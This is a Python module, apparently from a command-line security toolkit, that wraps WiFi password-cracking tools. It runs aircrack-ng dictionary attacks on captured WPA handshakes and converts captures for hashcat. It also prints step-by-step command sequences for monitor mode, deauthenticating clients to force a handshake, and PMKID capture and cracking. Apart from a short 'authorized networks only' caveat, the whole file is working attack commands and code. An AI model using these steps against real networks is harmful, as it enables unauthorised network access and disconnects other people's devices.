from __future__ import annotations

from rich.prompt import Prompt

from .utils import console, header, pause, resolve_tool, run_tool


def crack_handshake() -> None:
    header("WPA handshake crack", "Offline dictionary attack on a captured .cap/.hccapx")
    if not resolve_tool("aircrack-ng"):
        console.print("[yellow]aircrack-ng not installed[/] — [cyan]pacman -S aircrack-ng[/]")
        return pause()
    cap = Prompt.ask("Capture file (.cap/.pcap with a handshake)").strip('"')
    wl = Prompt.ask("Wordlist path").strip('"')
    run_tool("aircrack-ng", ["-w", wl, cap], wsl_pathify={1, 2})
    pause()


def cap_to_hashcat() -> None:
    header("Convert capture -> hashcat", "hcxpcapngtool: .pcapng -> 22000 hash")
    if not resolve_tool("hcxpcapngtool"):
        console.print("[yellow]hcxpcapngtool not installed[/] — [cyan]pacman -S hcxtools[/]")
        return pause()
    cap = Prompt.ask("Capture file (.pcapng)").strip('"')
    run_tool("hcxpcapngtool", ["-o", "wpa.22000", cap], wsl_pathify={2})
    console.print("[green]Crack it:[/] [cyan]hashcat -m 22000 wpa.22000 rockyou.txt[/]")
    pause()


def capture_guide() -> None:
    header("Capture guide", "Getting a WPA handshake (needs a monitor-mode adapter)")
    for line in [
        "1. Kill interfering processes:  airmon-ng check kill",
        "2. Monitor mode:               airmon-ng start wlan0",
        "3. Find the target AP:         airodump-ng wlan0mon",
        "4. Capture on the AP channel:  airodump-ng -c <ch> --bssid <AP> -w cap wlan0mon",
        "5. Deauth to force a handshake: aireplay-ng -0 3 -a <AP> -c <client> wlan0mon",
        "6. Wait for 'WPA handshake' top-right, then crack cap-01.cap here.",
    ]:
        console.print("  " + line)
    console.print("\n[bright_black]Monitor mode needs real WiFi hardware — not available "
                  "inside WSL. Capture on a Linux host, then crack the .cap here.[/]")
    console.print("[bright_black]Authorized networks only.[/]")
    pause()


def pmkid() -> None:
    header("PMKID attack", "Clientless capture (no deauth needed)")
    for line in [
        "1. Capture PMKID:   hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1",
        "2. Convert:         hcxpcapngtool -o pmkid.22000 pmkid.pcapng",
        "3. Crack:           hashcat -m 22000 pmkid.22000 rockyou.txt",
    ]:
        console.print("  " + line)
    console.print("\n[bright_black]Works against APs that leak a PMKID in the first "
                  "EAPOL frame. Authorized targets only.[/]")
    pause()


MENU = {
    "1": ("Crack WPA handshake (aircrack-ng)", crack_handshake),
    "2": ("Convert capture for hashcat", cap_to_hashcat),
    "3": ("Handshake capture guide", capture_guide),
    "4": ("PMKID attack guide", pmkid),
}
